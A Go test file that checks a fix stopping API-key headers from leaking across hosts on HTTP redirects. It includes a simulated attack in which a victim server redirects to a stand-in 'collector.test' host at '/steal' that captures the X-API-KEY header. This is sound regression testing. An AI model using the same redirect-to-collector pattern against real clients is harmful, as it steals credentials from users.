package httpsafe

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

// TestNoCredentialRedirect_CrossHostLeak is the SEC F25 regression proof. It
// stands up two servers on DISTINCT hostnames (both dialed to loopback via a
// custom DialContext — httptest's same-host-different-port does NOT reproduce
// Go's custom-header propagation), has the victim 302 to the collector, and
// checks whether the collector receives the X-API-KEY header.
//
//   - default stdlib policy (CheckRedirect == nil): the collector RECEIVES the
//     key — this documents the vulnerability (and would have passed before the
//     fix existed).
//   - NoCredentialRedirect: the collector receives NOTHING — this fails to even
//     compile against the pre-fix tree (the symbol didn't exist) and passes once
//     the helper lands.
func TestNoCredentialRedirect_CrossHostLeak(t *testing.T) {
	const victimHost = "victim.test"
	const collectorHost = "collector.test"

	var gotKey string
	collector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotKey = r.Header.Get("X-API-KEY")
		w.WriteHeader(http.StatusOK)
	}))
	defer collector.Close()

	victim := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "http://"+collectorHost+"/steal", http.StatusFound)
	}))
	defer victim.Close()

	// Map the two fake hostnames onto the real loopback listeners.
	victimAddr := victim.Listener.Addr().String()
	collectorAddr := collector.Listener.Addr().String()
	dial := func(ctx context.Context, network, addr string) (net.Conn, error) {
		var d net.Dialer
		switch addr {
		case victimHost + ":80":
			addr = victimAddr
		case collectorHost + ":80":
			addr = collectorAddr
		}
		return d.DialContext(ctx, network, addr)
	}

	doRequest := func(check func(*http.Request, []*http.Request) error) string {
		gotKey = ""
		c := &http.Client{
			Timeout:       5 * time.Second,
			Transport:     &http.Transport{DialContext: dial},
			CheckRedirect: check,
		}
		req, _ := http.NewRequest("GET", "http://"+victimHost+"/", nil)
		req.Header.Set("X-API-KEY", "super-secret-er1-key")
		req.Header.Set("X-Context-ID", "ctx-123")
		resp, err := c.Do(req)
		if err != nil {
			t.Fatalf("request: %v", err)
		}
		_ = resp.Body.Close()
		return gotKey
	}

	// Sanity: the default policy leaks (proves the test reproduces the threat).
	if leaked := doRequest(nil); leaked == "" {
		t.Skip("environment did not reproduce cross-host custom-header propagation; F25 mechanism unverified here")
	}

	// The fix: NoCredentialRedirect must prevent the leak.
	if leaked := doRequest(NoCredentialRedirect); leaked != "" {
		t.Errorf("X-API-KEY leaked to cross-host redirect target despite NoCredentialRedirect: %q", leaked)
	}
}

// TestNoCredentialRedirect_SameHostKeepsHeaders verifies a same-host redirect
// (e.g. /a → /b on the same server) does NOT strip the credential — the fix
// must not break legitimate intra-host redirects.
func TestNoCredentialRedirect_SameHostKeepsHeaders(t *testing.T) {
	var gotKey string
	hops := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/start" {
			hops++
			http.Redirect(w, r, "/end", http.StatusFound)
			return
		}
		gotKey = r.Header.Get("X-API-KEY")
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	c := &http.Client{Timeout: 5 * time.Second, CheckRedirect: NoCredentialRedirect}
	req, _ := http.NewRequest("GET", srv.URL+"/start", nil)
	req.Header.Set("X-API-KEY", "k")
	resp, err := c.Do(req)
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	_ = resp.Body.Close()
	if hops != 1 {
		t.Fatalf("expected one same-host redirect, got %d", hops)
	}
	if gotKey != "k" {
		t.Errorf("same-host redirect should KEEP X-API-KEY, got %q", gotKey)
	}
}

// TestNoCredentialRedirect_CapsChain verifies the redirect cap.
func TestNoCredentialRedirect_CapsChain(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/loop", http.StatusFound)
	}))
	defer srv.Close()
	c := &http.Client{Timeout: 5 * time.Second, CheckRedirect: NoCredentialRedirect}
	req, _ := http.NewRequest("GET", srv.URL+"/loop", nil)
	if _, err := c.Do(req); err == nil {
		t.Error("expected an error after the redirect cap, got nil")
	}
}
